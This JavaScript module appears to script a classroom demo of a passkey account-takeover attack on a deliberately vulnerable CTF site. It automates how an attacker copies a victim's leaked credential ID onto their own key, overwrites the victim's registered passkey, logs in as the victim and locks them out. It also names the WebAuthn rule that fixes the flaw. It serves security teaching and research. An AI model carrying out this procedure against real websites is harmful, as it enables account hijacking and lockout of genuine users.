import { randomUUID } from 'node:crypto';
import {
  restartBrowsers, configureExtension, initLocalKeyStore, openCtfInstance,
  createCtfAccount, registerDefaultPasskey, logOutOfCtf, shownKeyName,
} from '../setup.js';
import {
  VICTIM_KEY, ATTACKER_KEY, CTF_PASSWORD, SELECTORS, sleep, BEAT_MS, SHOW_SELECTION_MS,
  learning, interceptor, interceptorOpen, usernameOf,
  openSettingsTask, addPasskeyTasks, sendTask, logoutTask, keepSelectionTask,
  usernameFirstPasskeyLoginTask, passwordFallbackLoginTasks, removeUserHandleTask, passkeysToolsTabHighlight,
  keyOverwritten, attackerIsVictim, victimLockedOut,
} from './common.js';

/**
 * The attacker's view: the victim is already signed in with a passkey. The attacker knows
 * only the victim's username, learns the victim's credential ID from the username-first
 * login (allowCredentials), puts it on their own key in PASSKEYS-ATTACKER, overwrites the
 * victim's passkey, logs in as the victim, and the victim is locked out.
 *
 * Unlike the full story, the two browsers share nothing but the website: each keeps its
 * own local passkeys.tools key store.
 */

const VICTIM_NAME = 'victim';
const ATTACKER_NAME = 'attacker';

const SETUP_STAGES = [
  { id: 'browsers', label: 'Restart both browsers with fresh, empty profiles' },
  { id: 'extension', label: 'Install PASSKEYS-ATTACKER in both browsers, each with its own local key store' },
  { id: 'ctf', label: 'Open a fresh CTF instance with a username-first login and the vulnerable registration' },
  { id: 'accounts', label: 'Victim: account with a passkey, signed in · Attacker: own account, logged out' },
];

async function prepare({ browsers: { victim, attacker }, config, onStage }) {
  const instanceId = randomUUID();

  onStage('browsers');
  await restartBrowsers([victim, attacker]);

  onStage('extension');
  await Promise.all([victim, attacker].map(async (browser) => {
    await configureExtension(browser, config);
    await initLocalKeyStore(browser, config);
  }));

  onStage('ctf');
  const verifiers = {
    registrationVerifier: config.verifiers.registration,
    authenticationVerifier: config.verifiers.usernameFirstLogin,
  };
  await Promise.all([
    openCtfInstance(victim, config, instanceId, verifiers),
    openCtfInstance(attacker, config, instanceId, verifiers),
  ]);

  onStage('accounts');
  await Promise.all([
    (async () => {
      await createCtfAccount(victim, config, VICTIM_NAME, CTF_PASSWORD);
      await registerDefaultPasskey(victim, config);
    })(),
    (async () => {
      await createCtfAccount(attacker, config, ATTACKER_NAME, CTF_PASSWORD);
      await logOutOfCtf(attacker, config);
    })(),
  ]);
  return { instanceId };
}

// ─── Recon facts ────────────────────────────────────────────────────────────

const recon = (s) => s.facts.scenario;
const leakedId = (s) => recon(s).leakedCredentialId ?? null;
/** The attacker's key that carries the victim's credential ID (normally "attacker | ES256"). */
const forgedKey = (s) => recon(s).forgedKey ?? ATTACKER_KEY;
const victimName = (s) => usernameOf(s, 'victim');

/** Latches recon progress from what is visible in the attacker's browser. */
function observe(s) {
  const r = recon(s);
  const view = interceptor(s, 'attacker');
  if (!r.leakedCredentialId && !s.facts.overwrite && view?.op === 'get' && view.allowCredentials.length > 0) {
    [r.leakedCredentialId] = view.allowCredentials;
  }
  if (!r.leakedCredentialId) return;
  const copied = s.facts.lastCopy.attacker ?? '';
  if (!r.copied && copied.includes(r.leakedCredentialId)) r.copied = true;
  if (!r.keysTabSeen && view?.tab === '/keys') r.keysTabSeen = true;
  if (!r.forgedKey && view?.keyCredentialIds) {
    const leakedHex = Buffer.from(r.leakedCredentialId, 'base64url').toString('hex');
    const match = Object.entries(view.keyCredentialIds).find(([, credentialId]) => credentialId === leakedHex);
    if (match) r.forgedKey = shownKeyName(match[0]);
  }
  if (r.forgedKey && !r.reconClosed && !interceptorOpen(s, 'attacker', 'get')) r.reconClosed = true;
  if (r.reconClosed && !r.attackerLoggedIn && learning(s, 'attacker')?.user === usernameOf(s, 'attacker')) r.attackerLoggedIn = true;
}

const idFound = (s) => Boolean(recon(s).copied || recon(s).keysTabSeen || recon(s).forgedKey);
const keyForged = (s) => Boolean(recon(s).forgedKey);
const reconFinished = (s) => Boolean(recon(s).reconClosed);
const attackerLoggedIn = (s) => Boolean(recon(s).attackerLoggedIn) || keyOverwritten(s);

// ─── Recon tasks ────────────────────────────────────────────────────────────

const copyCredentialIdTask = {
  id: 'copy-credential-id',
  text: 'Copy the victim’s ID from <code>allowCredentials</code> (<b>Ctrl+C</b>)',
  done: idFound,
  highlight: (s) => (interceptorOpen(s, 'attacker', 'get') && leakedId(s) ? {
    page: 'interceptor',
    targets: [{
      id: 'leaked-id',
      selectors: [SELECTORS.requestTextarea],
      label: 'Selected: the victim’s credential ID → press Ctrl+C',
      select: { text: leakedId(s) },
    }],
  } : null),
  run: async ({ browser, state }) => {
    const page = await browser.waitForInterceptorPage();
    await browser.focus(page);
    await page.evaluate((id) => {
      const textarea = document.getElementById('interceptorRequestTextarea');
      const start = textarea.value.indexOf(id);
      textarea.focus({ preventScroll: true });
      textarea.setSelectionRange(start, start + id.length);
    }, leakedId(state()));
    await sleep(SHOW_SELECTION_MS);
    await page.keyboard.press('Control+C');
  },
};

const openKeysTabTask = {
  id: 'open-keys-tab',
  text: 'Open the <b>Keys</b> tab (☰ menu)',
  done: (s) => interceptor(s, 'attacker')?.tab === '/keys' || keyForged(s),
  highlight: (s) => (interceptorOpen(s, 'attacker', 'get') ? passkeysToolsTabHighlight(s, 'attacker', 'keys', 'Click “Keys”') : null),
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await browser.openPasskeysToolsTab(page, 'keys');
  },
};

const pasteCredentialIdTask = {
  id: 'paste-credential-id',
  text: 'Paste it into <b>B64URL</b> (<b>Ctrl+V</b>)',
  done: (s) => interceptor(s, 'attacker')?.keysForm.b64url.trim() === leakedId(s) || keyForged(s),
  highlight: (s) => (interceptor(s, 'attacker')?.tab === '/keys' ? {
    page: 'interceptor',
    targets: [{ id: 'paste', selectors: [SELECTORS.keysUpdateB64url], label: 'Paste the victim’s credential ID (Ctrl+V)' }],
  } : null),
  run: async ({ browser, state }) => {
    const page = await browser.waitForInterceptorPage();
    const field = page.locator(SELECTORS.keysUpdateB64url);
    await field.click();
    await page.keyboard.press('Control+V');
    await sleep(BEAT_MS / 2);
    // Fall back to typing if the clipboard was not available to the automation.
    if ((await field.inputValue()).trim() !== leakedId(state())) await field.fill(leakedId(state()));
  },
};

const chooseOwnKeyTask = {
  id: 'choose-own-key',
  text: `Key: <code>${ATTACKER_KEY}</code>`,
  done: (s) => interceptor(s, 'attacker')?.keysForm.key === ATTACKER_KEY || keyForged(s),
  highlight: (s) => (interceptor(s, 'attacker')?.tab === '/keys' ? {
    page: 'interceptor',
    targets: [{ id: 'own-key', selectors: [SELECTORS.keysUpdateKey], label: `Choose “${ATTACKER_KEY}”` }],
  } : null),
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await page.selectOption(SELECTORS.keysUpdateKey, { label: ATTACKER_KEY });
  },
};

const updateKeyTask = {
  id: 'update-key',
  text: 'Click <b>Update</b>',
  done: keyForged,
  highlight: (s) => (interceptor(s, 'attacker')?.tab === '/keys' ? {
    page: 'interceptor',
    targets: [{ id: 'update', selectors: [SELECTORS.keysUpdateButton], label: 'Click “Update”' }],
  } : null),
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await page.click(SELECTORS.keysUpdateButton);
  },
};

const dismissLoginTask = {
  id: 'dismiss-login',
  text: 'Back to <b>Interceptor</b> → <b>Dismiss</b>',
  done: reconFinished,
  highlight: (s) => {
    if (!interceptorOpen(s, 'attacker', 'get')) return null;
    if (interceptor(s, 'attacker').tab !== '/interceptor') {
      return passkeysToolsTabHighlight(s, 'attacker', 'interceptor', 'Click “Interceptor”');
    }
    return { page: 'interceptor', targets: [{ id: 'dismiss', selectors: [SELECTORS.dismiss], label: 'Click “Dismiss”' }] };
  },
  run: async ({ browser }) => {
    const page = await browser.waitForInterceptorPage();
    await browser.openPasskeysToolsTab(page, 'interceptor');
    await sleep(BEAT_MS);
    await page.click(SELECTORS.dismiss);
    const learningTab = browser.learningPage();
    if (learningTab) await browser.focus(learningTab);
  },
};

// ─── Steps ──────────────────────────────────────────────────────────────────

const steps = [
  {
    id: 'intro',
    short: 'Intro',
    marker: 'i',
    focus: null,
    kicker: 'Demo · Account Takeover',
    title: 'From a username to account takeover',
    lead: 'The attacker knows only the victim’s username.',
    points: [
      '<span class="tag victim">Left</span> victim: signed in, with a passkey. <span class="tag attacker">Right</span> attacker: own account, logged out.',
      'Both use PASSKEYS-ATTACKER, but share nothing except the website.',
    ],
    why: { title: 'How to follow', body: 'The diagram shows the whole attack; the current step lights up.' },
    tasks: [],
    complete: () => true,
  },
  {
    id: 'find-credential-id',
    short: 'Find the ID',
    marker: '1',
    focus: 'attacker',
    quietLoginFailures: true,
    kicker: 'Step 1 · Attacker',
    title: 'Find the victim’s credential ID',
    lead: 'Start a login as the victim — the website answers with the ID.',
    why: {
      title: 'The leak',
      body: 'Username-first logins send the user’s credential IDs (<code>allowCredentials</code>) to anyone — allowed, since they aren’t secret.',
    },
    tasks: [
      usernameFirstPasskeyLoginTask('attacker', victimName, 'Click <b>Login</b>, type <code>{victim}</code>, <b>Continue</b>', (s) => Boolean(leakedId(s))),
      copyCredentialIdTask,
    ],
    complete: idFound,
    doneMessage: '🔎 Victim’s credential ID: {leaked}',
  },
  {
    id: 'forge-key',
    short: 'Borrow the ID',
    marker: '2',
    focus: 'attacker',
    quietLoginFailures: true,
    kicker: 'Step 2 · Attacker',
    title: 'Put the ID on the attacker’s key',
    lead: 'In PASSKEYS-ATTACKER’s key store, then cancel the login.',
    why: { title: 'A borrowed name', body: 'The key pair stays the attacker’s — only its credential ID now matches the victim’s.' },
    tasks: [openKeysTabTask, pasteCredentialIdTask, chooseOwnKeyTask, updateKeyTask, dismissLoginTask],
    complete: reconFinished,
    doneMessage: `🔑 ${ATTACKER_KEY} now carries the victim’s ID`,
  },
  {
    id: 'attacker-login',
    short: 'Log in',
    marker: '3',
    focus: 'attacker',
    kicker: 'Step 3 · Attacker',
    title: 'Log in to the attacker’s account',
    lead: 'An ordinary account without a passkey, so the website asks for the password.',
    why: { title: 'Nothing special', body: 'Any account on the website works.' },
    tasks: passwordFallbackLoginTasks('attacker', ATTACKER_NAME, attackerLoggedIn),
    complete: attackerLoggedIn,
    doneMessage: '✓ Logged in as “{attacker}”',
  },
  {
    id: 'overwrite',
    short: 'Overwrite',
    marker: '4',
    focus: 'attacker',
    kicker: 'Step 4 · Attacker',
    title: 'Overwrite the victim’s passkey',
    lead: 'Register a passkey with the key carrying the victim’s ID.',
    why: {
      title: 'The bug',
      body: 'The website should reject a known credential ID (WebAuthn §7.1.26), but it <b>replaces the victim’s public key</b> with the attacker’s.',
    },
    tasks: [
      openSettingsTask('attacker', keyOverwritten),
      ...addPasskeyTasks('attacker', keyOverwritten),
      keepSelectionTask('attacker', 'create', (s) => ({ credentialId: forgedKey(s), key: ATTACKER_KEY }),
        `Keep <code>${ATTACKER_KEY}</code> (now with the victim’s ID)`, keyOverwritten),
      sendTask('attacker', 'create', keyOverwritten),
    ],
    complete: keyOverwritten,
    doneMessage: '🚩 Flag captured: {flag}',
  },
  {
    id: 'takeover',
    short: 'Takeover',
    marker: '5',
    focus: 'attacker',
    kicker: 'Step 5 · Attacker',
    title: 'Log in as the victim',
    lead: 'Victim’s credential ID, signed with the attacker’s key.',
    why: {
      title: 'Why it works',
      body: 'The website checks the signature with the stored key — now the attacker’s — so the attacker is in <b>as the victim</b>.',
    },
    tasks: [
      logoutTask('attacker', 'Close the pop-up, then <b>{attacker}</b> → <b>Logout</b>', attackerIsVictim),
      usernameFirstPasskeyLoginTask('attacker', victimName, 'Click <b>Login</b>, type <code>{victim}</code>, <b>Continue</b>', attackerIsVictim),
      keepSelectionTask('attacker', 'get', (s) => ({ credentialId: forgedKey(s), key: ATTACKER_KEY }),
        `Keep <code>${ATTACKER_KEY}</code>`, attackerIsVictim),
      removeUserHandleTask('attacker', 'Delete the <code>userHandle</code> line (<b>Delete</b>) — it’s the attacker’s', attackerIsVictim),
      sendTask('attacker', 'get', attackerIsVictim),
    ],
    complete: attackerIsVictim,
    doneMessage: '😈 Logged in as “{victim}” — account takeover!',
  },
  {
    id: 'lockout',
    short: 'Lockout',
    marker: '6',
    focus: 'victim',
    kicker: 'Step 6 · Victim',
    title: 'The victim is locked out',
    lead: 'The victim logs out and tries their genuine passkey.',
    why: { title: 'Locked out', body: 'The stored key is now the attacker’s, so the victim’s signature fails.' },
    tasks: [
      logoutTask('victim', 'Log out: <b>{victim}</b> → <b>Logout</b>', victimLockedOut),
      usernameFirstPasskeyLoginTask('victim', victimName, 'Click <b>Login</b>, type <code>{victim}</code>, <b>Continue</b>', victimLockedOut),
      keepSelectionTask('victim', 'get', { credentialId: VICTIM_KEY, key: VICTIM_KEY }, `Keep <code>${VICTIM_KEY}</code> (genuine key)`, victimLockedOut),
      sendTask('victim', 'get', victimLockedOut),
    ],
    complete: victimLockedOut,
    doneMessage: '🔒 “{victim}” is locked out',
  },
  {
    id: 'summary',
    short: 'Takeaways',
    marker: '★',
    focus: null,
    kicker: 'Takeaways',
    title: 'A username in, an account out',
    points: [
      '<b>Leak:</b> login pages hand out credential IDs — allowed, they aren’t secret.',
      '<b>Bug:</b> a known credential ID was accepted again, and its key replaced.',
      '<b>Fix:</b> reject known credential IDs, for any user (WebAuthn §7.1.26).',
      '<b>In the wild:</b> 12 of 103 sites accepted it; on 5, keys were overwritten (CVSS 9.1).',
    ],
    why: {
      title: 'Try it yourself',
      body: '<b>passkeys.tools</b> — PASSKEYS-ATTACKER<br><b>learning.passkeys.tools</b> — the CTF<br><b>Paper:</b> The State of Passkeys, USENIX Security ’26',
    },
    tasks: [],
    complete: () => true,
  },
];

/** The attack at a glance: one row per message, each belonging to the step that sends it. */
const diagram = [
  { step: 'find-credential-id', from: 'attacker', to: 'website', text: 'Log in as victim (username only)' },
  { step: 'find-credential-id', from: 'website', to: 'attacker', text: '🔎 Victim’s credential ID', kind: 'leak', reached: (s) => Boolean(leakedId(s)) },
  { step: 'forge-key', from: 'attacker', to: 'attacker', text: 'Put victim’s credential ID on attacker’s key' },
  { step: 'attacker-login', from: 'attacker', to: 'website', text: 'Log in as attacker (password)' },
  { step: 'overwrite', from: 'attacker', to: 'website', text: 'Register: victim’s credential ID + attacker’s key' },
  { step: 'overwrite', from: 'website', to: 'website', text: 'Replaces victim’s key with attacker’s key', kind: 'bad', reached: keyOverwritten },
  { step: 'takeover', from: 'attacker', to: 'website', text: 'Log in as victim, signed with attacker’s key' },
  { step: 'takeover', from: 'website', to: 'attacker', text: '✓ Signature valid: logged in as victim', kind: 'bad', reached: attackerIsVictim },
  { step: 'lockout', from: 'victim', to: 'website', text: 'Log in as victim, signed with victim’s key' },
  { step: 'lockout', from: 'website', to: 'victim', text: '✗ Signature invalid: locked out', kind: 'bad', reached: victimLockedOut },
];

export default {
  id: 'attacker-view',
  title: 'Demo: Account Takeover',
  headline: 'Credential Overwrite <span class="arrow">→</span> Account Takeover',
  summary: 'The victim is already signed in with a passkey. The attacker learns the victim’s credential ID from the login page, overwrites the victim’s passkey, takes over the account, and the victim is locked out.',
  presetNames: { victim: VICTIM_NAME, attacker: ATTACKER_NAME },
  separateKeyStores: true,
  loginCheck: 'signature',
  flagDetail: 'the victim’s passkey now holds the attacker’s key.',
  setupStages: SETUP_STAGES,
  prepare,
  observe,
  steps,
  diagram,
  notices: {
    overwriteMissed: 'That created a brand-new passkey for the attacker — its credential ID was not the victim’s. Check step 2: the attacker’s key must carry the victim’s credential ID.',
  },
};
